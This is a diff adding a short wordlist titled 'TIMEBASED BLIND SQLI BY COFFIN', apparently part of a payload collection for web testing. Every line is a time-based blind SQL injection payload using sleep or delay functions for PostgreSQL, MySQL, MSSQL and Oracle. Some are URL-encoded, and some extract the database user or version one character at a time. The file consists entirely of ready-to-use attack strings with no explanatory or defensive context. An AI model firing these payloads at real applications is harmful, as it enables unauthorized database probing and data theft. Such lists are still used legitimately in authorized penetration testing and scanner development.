@@ -1,0 +1,26 @@
+//TIMEBASED BLIND SQLI BY COFFIN :)
+
+SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
+1' sleep(25)='1
+**2b(select*from(select(sleep(2)))a)%2b
+dbms_pipe.receive_message(('a'),10)
+WAITFOR DELAY '0:0:25'--
+OR SLEEP(25)#
+AND SLEEP(25) AND ('kleiton'=' kleiton
+WAITFOR DELAY '0:0:25' and 'a'='a;--
+IF 1=1 THEN dbms_lock.sleep(25);
+1' AND SLEEP(5) AND '1'='1
+(SELECT(0) FROM (SELECT (SLEEP (7)))a)
+OR (SELECT 1337 FROM (SELECT(SLEEP(5))) YYYY)-- 1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5))) YYYY)-- 1337
+AND (SELECT COUNT(*) FROM (SELECT SLEEP(10))x)--
+or pg_SLEEP(5) #
+and if(substring(user(),1,1)>=chr(97), SLEEP(25),1)--
+DBMS_LOCK.SLEEP(25);
+AND if not (substring((select @version), 25, 1) < 52) waitfor delay '0:0:25'-
+1, '0'); wait for delay '0:0:25;--
+(SELECT 1 FROM (SELECT SLEEP(25))A)
+%2b(select*from(select(sleep(25)))a)%2b'
+//xor//sleep(25)
+or (sleep(25)+1) limit 1 -
+0'XOR(if (now()=sysdate(), sleep(15),0))XOR'Z
